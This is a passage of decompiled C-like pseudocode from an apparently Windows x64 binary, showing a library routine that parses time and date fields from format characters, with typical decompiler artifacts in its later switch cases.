               pcVar3 = *(*piVar84 + 0x48);\n                        *(ppiVar74 + -8) = 0x140036122;\n                        iVar46 = (*pcVar3)();\n                    }\n                    if (iVar46 == -1) {\n                        *(ppiVar74 + 0xc0) = 0;\n                    }\n                    arg3 = iVar46 == -1;\n                }\ncode_r0x0001400357ac:\n                cVar40 = arg3;\n                cVar79 = unaff_RBP;\n                if (cVar79 == '\\0') {\n                    cVar79 = arg1;\n                }\n                else {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar46 = *unaff_RDI[2];\n                    }\n                    else {\n                        piVar84 = *unaff_RDI;\n                        *(ppiVar74 + 100) = cVar40;\n                        pcVar3 = piVar84[9];\n                        *(ppiVar74 + -8) = 0x140036103;\n                        iVar46 = (*pcVar3)(unaff_RDI);\n                        cVar40 = *(ppiVar74 + 100);\n                    }\n                    if (iVar46 == -1) {\n                        unaff_RDI = NULL;\n                    }\n                    else {\n                        cVar79 = '\\0';\n                    }\n                }\n                *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n                if ((cVar40 != cVar79) && (ppiVar38 = ppiVar74,  (*(ppiVar74 + 0xd8) | *(ppiVar74 + 0xe0)) == 0)) {\ncode_r0x0001400357d8:\n                    ppiVar74 = ppiVar38;\n                    *(ppiVar74 + -8) = 0x1400357e8;\n                    iVar46 = fcn.1400240d0(ppiVar74 + 0xc0);\n                    pcVar3 = (*ppiVar52)[10];\n                    *(ppiVar74 + -8) = 0x1400357f9;\n                    iVar47 = (*pcVar3)(ppiVar52, 0x2d);\n                    if (iVar46 != iVar47) {\n                        *(ppiVar74 + -8) = 0x14003580a;\n                        iVar46 = fcn.1400240d0(ppiVar74 + 0xc0);\n                        pcVar3 = (*ppiVar52)[10];\n                        *(ppiVar74 + -8) = 0x14003581b;\n                        iVar47 = (*pcVar3)(ppiVar52);\n                        if (iVar46 != iVar47) {\n                            unaff_RSI = *(ppiVar74 + 200);\n                            *(ppiVar74 + 100) = 0;\n                            goto code_r0x0001400350c4;\n                        }\n                    }\n                    uVar57 = *(ppiVar74 + 0x88);\n                    *(ppiVar74 + 0x48) = unaff_R13;\n                    *(ppiVar74 + 0x28) = 0;\n                    uVar4 = *(ppiVar74 + 0x78);\n                    *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n                    *(ppiVar74 + 0x30) = 0x17;\n                    *(ppiVar74 + 0x20) = unaff_R14;\n                    *(ppiVar74 + 0x38) = 2;\n                    *(ppiVar74 + 0x98) = uVar4;\n                    *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n                    *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n                    *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n                    *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n                    *(ppiVar74 + 0x90) = unaff_RDI;\n                    *(ppiVar74 + -8) = 0x14003600d;\n                    fcn.140032a40(uVar57, *(ppiVar74 + 600), *(ppiVar74 + 0x70), unaff_R15);\n                    *(ppiVar74 + 0x48) = unaff_R13;\n                    *(ppiVar74 + 0x28) = 0;\n                    *(ppiVar74 + 0x38) = 2;\n                    *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n                    *(ppiVar74 + 0x30) = 0x3b;\n                    *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n                    *(ppiVar74 + 0x20) = unaff_R14;\n                    *(ppiVar74 + 0xc0) = *(ppiVar74 + 0xb0);\n                    *(ppiVar74 + 0x98) = uVar4;\n                    *(ppiVar74 + 0x90) = unaff_RDI;\n                    *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n                    *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n                    *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n                    *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n                    *(ppiVar74 + -8) = 0x140036096;\n                    fcn.140032a40(uVar57, *(ppiVar74 + 600), *(ppiVar74 + 0x70), unaff_R15);\n                    unaff_RSI = *(ppiVar74 + 0xb8);\n                    *(ppiVar74 + 0xc0) = *(ppiVar74 + 0xb0);\n                    *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n                    *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n                }\n                goto code_r0x0001400350c4;\n            }\n            goto code_r0x0001400340a6;\n        case '>':\n            ppiVar65 = ppiVar74 + 0xb0;\n            uVar57 = *(*(*(ppiVar74 + 0x80) + 0x10) + 0x30);\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0x38) = uVar57;\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x290);\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\ncode_r0x000140035328:\n            *(ppiVar74 + 0x30) = *(ppiVar74 + 0x280);\n            *(ppiVar74 + 0x28) = ppiVar74 + 0xd8;\n            *(ppiVar74 + 0x20) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + -8) = 0x14003536c;\n            fcn.140033e90(ppiVar65, *(ppiVar74 + 600), ppiVar74 + 0xa0, ppiVar74 + 0x90);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                *(*(ppiVar74 + 0x290) + 1) = *(*(ppiVar74 + 0x290) + 1) | 4;\n            }\n            goto code_r0x0001400340c1;\n        case '?':\n        case '@':\n            piVar84 = *(ppiVar74 + 0xc0);\n            if ((piVar84 != NULL) && (bVar86)) {\n                if (piVar84[2] < piVar84[3]) {\n                    iVar46 = *piVar84[2];\n                }\n                else {\n                    pcVar3 = *(*piVar84 + 0x48);\n                    *(ppiVar74 + -8) = 0x140035f80;\n                    iVar46 = (*pcVar3)();\n                }\n                if (iVar46 == -1) {\n                    *(ppiVar74 + 0xc0) = 0;\n                }\n            }\n            pcVar3 = (*ppiVar52)[2];\n            *(ppiVar74 + -8) = 0x1400346fc;\n            cVar40 = (*pcVar3)(ppiVar52, 0x20, iVar46);\n            if (cVar40 != '\\0') {\n                piVar84 = *(ppiVar74 + 0xc0);\n                if (piVar84[2] < piVar84[3]) {\n                    piVar84[2] = piVar84[2] + 2;\n                }\n                else {\n                    pcVar3 = *(*piVar84 + 0x50);\n                    *(ppiVar74 + -8) = 0x140035ee8;\n                    (*pcVar3)();\n                }\n                *(ppiVar74 + 200) = 0xffff;\n            }\n            *(ppiVar74 + 0x30) = 0x1f;\n            *(ppiVar74 + 0x28) = 1;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            *(ppiVar74 + 0x48) = ppiVar74 + 0xd8;\n            *(ppiVar74 + 0x38) = 2;\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + -8) = 0x14003478f;\n            fcn.140032a40(ppiVar74 + 0xb0, *(ppiVar74 + 600), ppiVar74 + 0xa0, ppiVar74 + 0x90);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                *(*(ppiVar74 + 0x280) + 0xc) = *(ppiVar74 + 0xdc);\n                puVar53 = *(ppiVar74 + 0x290);\ncode_r0x0001400347df:\n                *puVar53 = *puVar53 | 0x410;\n            }\n            goto code_r0x0001400340c1;\n        case 'E':\n            *(ppiVar74 + 0x30) = 0x16e;\n            ppiVar83 = ppiVar74 + 0x90;\n            ppiVar65 = ppiVar74 + 0xb0;\n            *(ppiVar74 + 0x28) = 1;\n            arg3 = *(ppiVar74 + 600);\n            in_stack_00000030 = ppiVar74 + 0xa0;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            ppiVar34 = ppiVar74;\ncode_r0x00014003521f:\n            ppiVar74 = ppiVar34;\n            *(ppiVar74 + 0x48) = ppiVar74 + 0xd8;\n            *(ppiVar74 + 0x38) = 3;\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + -8) = 0x14003526d;\n            fcn.140032a40(ppiVar65, arg3, in_stack_00000030, ppiVar83);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                *(*(ppiVar74 + 0x280) + 0x1c) = *(ppiVar74 + 0xdc) + -1;\n                **(ppiVar74 + 0x290) = **(ppiVar74 + 0x290) | 4;\n            }\n            goto code_r0x0001400340c1;\n        case 'H':\n            *(ppiVar74 + 0x30) = 0xc;\n            ppiVar83 = ppiVar74 + 0x90;\n            ppiVar65 = ppiVar74 + 0xb0;\n            *(ppiVar74 + 0x28) = 1;\n            arg3 = *(ppiVar74 + 600);\n            in_stack_00000030 = ppiVar74 + 0xa0;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            UNRECOVERED_JUMPTABLE._0_8_ = ppiVar74 + 0xd8;\n            in_XMM5_Da = *(ppiVar74 + 0xc0);\n            in_XMM5_Db = *(ppiVar74 + 0xc4);\n            in_XMM5_Dc = *(ppiVar74 + 200);\n            in_XMM5_Dd = *(ppiVar74 + 0xcc);\ncode_r0x0001400354e4:\n            *(ppiVar74 + 0x48) = UNRECOVERED_JUMPTABLE._0_8_;\n            *(ppiVar74 + 0x38) = 2;\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = in_XMM5_Da;\n            *(ppiVar74 + 0xa4) = in_XMM5_Db;\n            *(ppiVar74 + 0xa8) = in_XMM5_Dc;\n            *(ppiVar74 + 0xac) = in_XMM5_Dd;\n            *(ppiVar74 + -8) = 0x140035521;\n            fcn.140032a40(ppiVar65, arg3, in_stack_00000030, ppiVar83);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                *(*(ppiVar74 + 0x280) + 0x10) = *(ppiVar74 + 0xdc) + -1;\n                **(ppiVar74 + 0x290) = **(ppiVar74 + 0x290) | 8;\n            }\n            goto code_r0x0001400340c1;\n        case 'I':\n        case 'O':\n            ppiVar83 = *(ppiVar74 + 0xc0);\n            while( true ) {\n                uVar42 = unaff_RSI == -1;\n                uVar43 = ppiVar83 != NULL && uVar42;\n                uVar64 = uVar43;\n                if (uVar43) {\n                    if (ppiVar83[2] < ppiVar83[3]) {\n                        iVar46 = *ppiVar83[2];\n                    }\n                    else {\n                        piVar84 = *ppiVar83;\n                        *(ppiVar74 + 0x70) = uVar43;\n                        pcVar3 = piVar84[9];\n                        *(ppiVar74 + -8) = 0x140035ce2;\n                        iVar46 = (*pcVar3)(ppiVar83);\n                        uVar43 = *(ppiVar74 + 0x70);\n                    }\n                    uVar42 = 0;\n                    uVar64 = uVar43;\n                    if (iVar46 == -1) {\n                        ppiVar83 = NULL;\n                        uVar64 = 0;\n                        *(ppiVar74 + 0xc0) = 0;\n                        uVar42 = uVar43;\n                    }\n                }\n                uVar78 = unaff_RDI != NULL & uVar41;\n                uVar43 = uVar41;\n                if (uVar78 != 0) {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar46 = *unaff_RDI[2];\n                    }\n                    else {\n                        piVar84 = *unaff_RDI;\n                        *(ppiVar74 + 0x70) = uVar64;\n                        pcVar3 = piVar84[9];\n                        *(ppiVar74 + -8) = 0x140035cf9;\n                        iVar46 = (*pcVar3)(unaff_RDI);\n                        uVar64 = *(ppiVar74 + 0x70);\n                    }\n                    if (iVar46 == -1) {\n                        unaff_RDI = NULL;\n                        uVar43 = uVar78;\n                    }\n                    else {\n                        uVar43 = 0;\n                    }\n                }\n                if (uVar42 == uVar43) break;\n                if (uVar64 != 0) {\n                    if (ppiVar83[2] < ppiVar83[3]) {\n                        iVar46 = *ppiVar83[2];\n                    }\n                    else {\n                        pcVar3 = (*ppiVar83)[9];\n                        *(ppiVar74 + -8) = 0x140035d0d;\n                        iVar46 = (*pcVar3)(ppiVar83);\n                    }\n                    if (iVar46 == -1) {\n                        *(ppiVar74 + 0xc0) = 0;\n                        ppiVar83 = NULL;\n                    }\n                }\n                pcVar3 = (*ppiVar52)[2];\n                *(ppiVar74 + -8) = 0x1400349a6;\n                cVar40 = (*pcVar3)(ppiVar52);\n                if (cVar40 == '\\0') break;\n                if (ppiVar83[2] < ppiVar83[3]) {\n                    ppiVar83[2] = ppiVar83[2] + 2;\n                }\n                else {\n                    pcVar3 = (*ppiVar83)[10];\n                    *(ppiVar74 + -8) = 0x140035b42;\n                    (*pcVar3)(ppiVar83);\n                }\n                unaff_RSI = 0xffffffff;\n                *(ppiVar74 + 200) = 0xffff;\n            }\n            goto code_r0x0001400340c1;\n        case 'K':\n            piVar67 = *(*(*(ppiVar74 + 0x80) + 0x10) + 0x40);\n            piVar55 = *(*(*(ppiVar74 + 0x80) + 0x10) + 0x48);\n            *(ppiVar74 + 0xe0) = piVar67;\n            *(ppiVar74 + 0xe8) = piVar55;\n            if ((*piVar67 == 0) || (*piVar55 == 0)) {\ncode_r0x0001400350c4:\n                ppiVar83 = *(ppiVar74 + 0xc0);\n            }\n            else {\n                *(ppiVar74 + 0x30) = 2;\n                *(ppiVar74 + 0x90) = unaff_RDI;\n                *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n                *(ppiVar74 + 0x40) = ppiVar74 + 0xd8;\n                *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n                *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n                *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n                *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n                *(ppiVar74 + 0x38) = *(ppiVar74 + 0x270);\n                *(ppiVar74 + 0x28) = ppiVar74 + 0xe0;\n                *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n                *(ppiVar74 + -8) = 0x140035c22;\n                fcn.140032f70(ppiVar74 + 0xb0, *(ppiVar74 + 600), ppiVar74 + 0xa0, ppiVar74 + 0x90, *(ppiVar74 + 0x20), \n                              *(ppiVar74 + 0x28), *(ppiVar74 + 0x30), *(ppiVar74 + 0x38), *(ppiVar74 + 0x40), \n                              *(ppiVar74 + 0x48), *(ppiVar74 + 0x50), *(ppiVar74 + 0x58), *(ppiVar74 + 0x60), \n                              *(ppiVar74 + 0x68), *(ppiVar74 + 0x70), *(ppiVar74 + 0x78), *(ppiVar74 + 0x80));\n                ppiVar83 = *(ppiVar74 + 0xb0);\n                unaff_RSI = *(ppiVar74 + 0xb8);\n                *(ppiVar74 + 0xc0) = ppiVar83;\n                *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n                *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n                if ((*(ppiVar74 + 0xd8) == 0) && (*(ppiVar74 + 0xdc) != 0)) {\n                    *(*(ppiVar74 + 0x290) + 1) = *(*(ppiVar74 + 0x290) + 1) | 1;\n                }\n            }\n            goto code_r0x0001400340c1;\n        case 'M':\n            UNRECOVERED_JUMPTABLE._0_8_ = *(ppiVar74 + 0x80);\n            ppiVar65 = ppiVar74 + 0xb0;\n            in_XMM1_Da = *(ppiVar74 + 0xc0);\n            in_XMM1_Db = *(ppiVar74 + 0xc4);\n            in_XMM1_Dc = *(ppiVar74 + 200);\n            in_XMM1_Dd = *(ppiVar74 + 0xcc);\ncode_r0x000140035050:\n            iVar58 = UNRECOVERED_JUMPTABLE._0_8_[2][10];\n            *(ppiVar74 + 0xa0) = in_XMM1_Da;\n            *(ppiVar74 + 0xa4) = in_XMM1_Db;\n            *(ppiVar74 + 0xa8) = in_XMM1_Dc;\n            *(ppiVar74 + 0xac) = in_XMM1_Dd;\n            break;\n        case 'R':\n            UNRECOVERED_JUMPTABLE._0_8_ = *(ppiVar74 + 0x78);\n            *(ppiVar74 + 0x30) = 6;\n            ppiVar83 = ppiVar74 + 0x90;\n            ppiVar65 = ppiVar74 + 0xb0;\n            *(ppiVar74 + 0x28) = 0;\n            arg3 = *(ppiVar74 + 600);\n            in_stack_00000030 = ppiVar74 + 0xa0;\n            ppiVar33 = ppiVar74;\ncode_r0x000140035134:\n            ppiVar74 = ppiVar33;\n            *(ppiVar74 + 0x98) = UNRECOVERED_JUMPTABLE._0_8_;\n            *(ppiVar74 + 0x48) = ppiVar74 + 0xd8;\n            *(ppiVar74 + 0x38) = 1;\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + -8) = 0x14003518a;\n            fcn.140032a40(ppiVar65, arg3, in_stack_00000030, ppiVar83);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                *(*(ppiVar74 + 0x280) + 0x18) = *(ppiVar74 + 0xdc);\n                **(ppiVar74 + 0x290) = **(ppiVar74 + 0x290) | 2;\n            }\n            goto code_r0x0001400340c1;\n        case 'S':\n            ppiVar65 = ppiVar74 + 0xb0;\n            iVar58 = *(*(*(ppiVar74 + 0x80) + 0x10) + 0x10);\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            break;\n        case 'T':\n            *(ppiVar74 + 0x30) = 99;\n            *(ppiVar74 + 0x28) = 0;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            *(ppiVar74 + 0x48) = ppiVar74 + 0xd8;\n            *(ppiVar74 + 0x38) = 2;\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + -8) = 0x1400359f7;\n            fcn.140032a40(ppiVar74 + 0xb0, *(ppiVar74 + 600), ppiVar74 + 0xa0, ppiVar74 + 0x90);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                *(*(ppiVar74 + 0x290) + 1) = *(*(ppiVar74 + 0x290) + 1) | 6;\n                bVar86 = *(ppiVar74 + 200) == -1;\n                if ((ppiVar83 != NULL) && (bVar86)) {\n                    if (ppiVar83[2] < ppiVar83[3]) {\n                        iVar46 = *ppiVar83[2];\n                    }\n                    else {\n                        pcVar3 = (*ppiVar83)[9];\n                        *(ppiVar74 + -8) = 0x1400360cc;\n                        iVar46 = (*pcVar3)();\n                    }\n                    if (iVar46 == -1) {\n                        *(ppiVar74 + 0xc0) = 0;\n                    }\n                    bVar86 = iVar46 == -1;\n                }\n                uVar64 = uVar41;\n                uVar42 = uVar43;\n                if (uVar43 != 0) {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar46 = *unaff_RDI[2];\n                    }\n                    else {\n                        pcVar3 = (*unaff_RDI)[9];\n                        *(ppiVar74 + -8) = 0x1400360f1;\n                        iVar46 = (*pcVar3)(unaff_RDI);\n                    }\n                    if (iVar46 == -1) {\n                        unaff_RDI = NULL;\n                        uVar42 = 0;\n                        uVar64 = uVar43;\n                    }\n                    else {\n                        uVar64 = 0;\n                    }\n                }\n                iVar66 = *(ppiVar74 + 0xdc);\n                if (bVar86 == uVar64) {\ncode_r0x000140035a70:\n                    if (iVar66 < 0x45) {\n                        iVar66 = iVar66 + 100;\n                    }\n                    ppiVar83 = *(ppiVar74 + 0xc0);\n                }\n                else {\n                    *(ppiVar74 + -8) = 0x140035d26;\n                    fcn.1400240d0(ppiVar74 + 0xc0);\n                    pcVar3 = (*ppiVar52)[0xc];\n                    *(ppiVar74 + -8) = 0x140035d39;\n                    cVar40 = (*pcVar3)();\n                    if (9 < cVar40 - 0x30U) goto code_r0x000140035a70;\n                    piVar84 = *(ppiVar74 + 0xc0);\n                    iVar66 = (cVar40 - 0x30U) + iVar66 * 10;\n                    piVar67 = piVar84[3];\n                    if (piVar84[2] < piVar67) {\n                        piVar55 = piVar84[2] + 1;\n                        *(ppiVar74 + 0xdc) = iVar66;\n                        piVar84[2] = piVar55;\n                        *(ppiVar74 + 200) = 0xffff;\n                    }\n                    else {\n                        pcVar3 = *(*piVar84 + 0x50);\n                        *(ppiVar74 + -8) = 0x140035f22;\n                        (*pcVar3)();\n                        *(ppiVar74 + 0xdc) = iVar66;\n                        piVar55 = piVar84[2];\n                        *(ppiVar74 + 200) = 0xffff;\n                        piVar67 = piVar84[3];\n                    }\n                    if (piVar55 < piVar67) {\n                        iVar46 = *piVar55;\n                    }\n                    else {\n                        pcVar3 = *(*piVar84 + 0x48);\n                        *(ppiVar74 + -8) = 0x140036131;\n                        iVar46 = (*pcVar3)();\n                    }\n                    if (iVar46 == -1) {\n                        *(ppiVar74 + 0xc0) = 0;\n                    }\n                    if (uVar42 != 0) {\n                        if (unaff_RDI[2] < unaff_RDI[3]) {\n                            iVar47 = *unaff_RDI[2];\n                        }\n                        else {\n                            pcVar3 = (*unaff_RDI)[9];\n                            *(ppiVar74 + -8) = 0x14003613f;\n                            iVar47 = (*pcVar3)(unaff_RDI);\n                        }\n                        if (iVar47 == -1) {\n                            unaff_RDI = NULL;\n                            uVar41 = uVar42;\n                        }\n                        else {\n                            uVar41 = 0;\n                        }\n                    }\n                    if ((iVar46 == -1) == uVar41) {\n                        ppiVar83 = *(ppiVar74 + 0xc0);\n                    }\n                    else {\n                        *(ppiVar74 + -8) = 0x140035e83;\n                        fcn.1400240d0(ppiVar74 + 0xc0);\n                        pcVar3 = (*ppiVar52)[0xc];\n                        *(ppiVar74 + -8) = 0x140035e96;\n                        cVar40 = (*pcVar3)(ppiVar52);\n                        ppiVar83 = *(ppiVar74 + 0xc0);\n                        if (cVar40 - 0x30U < 10) {\n                            if (ppiVar83[2] < ppiVar83[3]) {\n                                ppiVar83[2] = ppiVar83[2] + 2;\n                            }\n                            else {\n                                pcVar3 = (*ppiVar83)[10];\n                                *(ppiVar74 + -8) = 0x1400360db;\n                                (*pcVar3)(ppiVar83);\n                                ppiVar83 = *(ppiVar74 + 0xc0);\n                            }\n                            *(ppiVar74 + 200) = 0xffff;\n                            *(ppiVar74 + 0xdc) = iVar66 * 10 + cVar40 + -0x30;\n                        }\n                    }\n                    iVar66 = *(ppiVar74 + 0xdc) + -0x76c;\n                    *(*(ppiVar74 + 0x290) + 1) = *(*(ppiVar74 + 0x290) + 1) & 0xfd;\n                }\n                *(*(ppiVar74 + 0x280) + 0x14) = iVar66;\n                unaff_RSI = *(ppiVar74 + 200);\n            }\n            goto code_r0x0001400340c1;\n        }\n        *(ppiVar74 + 0x90) = unaff_RDI;\n        *(ppiVar74 + 0x38) = iVar58;\n        *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n        *(ppiVar74 + 0x40) = *(ppiVar74 + 0x290);\ncode_r0x000140034cd2:\n        *(ppiVar74 + 0x30) = *(ppiVar74 + 0x280);\n        *(ppiVar74 + 0x28) = ppiVar74 + 0xd8;\n        *(ppiVar74 + 0x20) = *(ppiVar74 + 0x270);\n        *(ppiVar74 + -8) = 0x140034d16;\n        fcn.140033e90(ppiVar65, *(ppiVar74 + 600), ppiVar74 + 0xa0, ppiVar74 + 0x90);\n        ppiVar83 = *(ppiVar74 + 0xb0);\n        unaff_RSI = *(ppiVar74 + 0xb8);\n        *(ppiVar74 + 0xc0) = ppiVar83;\n        *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n        *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n        goto code_r0x0001400340c1;\n    default:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        ppiVar52 = fcn.1400b3700(0x1400fe028);\n        sub.msvcrt.dll_wcslen(in_stack_00000220);\n        iVar46 = unaff_RSI;\n        unaff_RSI = in_stack_00000060 & 0xffff;\n        arg1 = iVar46 == -1;\n        piStack16 = NULL;\n        in_stack_00000070 = 0;\n        ppiVar83 = in_stack_00000058;\n        ppiVar74 = &piStack104;\n        goto joined_r0x000140033f92;\n    case 0x81:\n    case 0xa1:\n        UNRECOVERED_JUMPTABLE._0_8_ = (uVar51 & 0xffffff00 | uVar41 & 0xe0) + 0x4cffffe9;\n        ppiVar65 = in_stack_00000048;\n        ppiVar74 = &piStack104;\n        goto code_r0x00014003454b;\n    case 0x82:\n    case 0xa2:\n    case 0xa8:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        bVar86 = 0xd7 < *0x1400fdfb3;\n        *0x1400fdfb3 = *0x1400fdfb3 + 0x28;\n        puVar82 = ppiVar83 + 0x3b;\n        uVar43 = *puVar82;\n        uVar42 = in_stack_00000038;\n        uVar64 = *puVar82;\n        *puVar82 = uVar64 + uVar42 + bVar86;\n        *unaff_R15 = (*unaff_R15 - uVar42) - (CARRY1(uVar43, uVar42) || CARRY1(uVar64 + uVar42, bVar86));\n        *(arg3 + 1) = *(arg3 + 1);\n        *(unaff_RDI + 0x1400fdfdf) = *(unaff_RDI + 0x1400fdfdf) + uVar41;\n        *(unaff_RSI + 0x41) = *(unaff_RSI + 0x41) + (UNRECOVERED_JUMPTABLE._0_8_ >> 8);\n        ppiVar83 = unaff_R13;\n        goto code_r0x000140034382;\n    case 0x83:\n        goto code_r0x0001400353e8;\n    case 0x84:\n        goto code_r0x000140035134;\n    case 0x88:\n        goto code_r0x00014003521f;\n    case 0x89:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        ppiVar74 = &piStack104;\n        goto code_r0x000140034da4;\n    case 0x8d:\n        pcVar54 = (UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff00 | uVar41 + *UNRECOVERED_JUMPTABLE._0_8_) - 0x77;\n        *pcVar54 = *pcVar54 + '(';\n        ppiVar74 = &piStack104;\n        goto code_r0x000140034cd2;\n    case 0x92:\n        uVar59 = uVar51 - 9;\n        ppiVar52 = ppiVar65;\n        ppiVar74 = &piStack104;\n        goto code_r0x000140034c8f;\n    case 0x93:\n        goto code_r0x000140034bb5;\n    case 0x94:\n        pcVar54 = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff00 | uVar41 + *UNRECOVERED_JUMPTABLE._0_8_;\n        *pcVar54 = *pcVar54 + uVar41 + *UNRECOVERED_JUMPTABLE._0_8_;\n        ppiVar74 = &piStack104;\n        goto code_r0x000140034ae2;\n    case 0x95:\n        